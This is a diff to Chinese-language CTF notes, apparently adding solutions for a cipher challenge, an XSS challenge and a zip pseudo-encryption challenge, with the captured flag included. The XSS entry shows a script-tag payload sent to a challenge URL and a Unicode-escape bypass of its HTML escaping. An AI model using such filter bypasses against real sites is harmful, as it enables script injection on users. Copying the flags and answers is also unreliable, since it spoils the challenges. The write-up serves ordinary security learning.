@@ -1118,3 +1118,38 @@ KEY{sad23jjdsa2}
 一段Base64
 ================
 用python脚本 ctf007.py
+
+===============
+奇怪的密码
+===============
+用 ctf008.py
+
+
+=============
+XSS
+=============
+
+XSS注入测试
+1、请注入一段XSS代码，获取Flag值
+
+2、必须包含alert(_key_)，_key_会自动被替换
+
+输入http://103.238.227.13:10089/?id=<script>alert(111)</script>
+
+被替换
+<script>
+	var s="&lt;script&gt;alert(111)&lt;/script&gt;";	document.getElementById('s').innerHTML = s;
+</script>
+
+用Unicode编码
+\u003cscript\u003ealert(111)\u003c/script\u003e
+
+返回不同行数据<script>
+	var s="\u003cscript\u003ealert('Flag:17f094325e90085b30a5ddefce34acd8')\u003c/script\u003e";	document.getElementById('s').innerHTML = s;
+	</script>
+
+
+===============
+  zip 伪加密
+===============
+用 winzip 打开，修改文件头位置0x47 09->00      
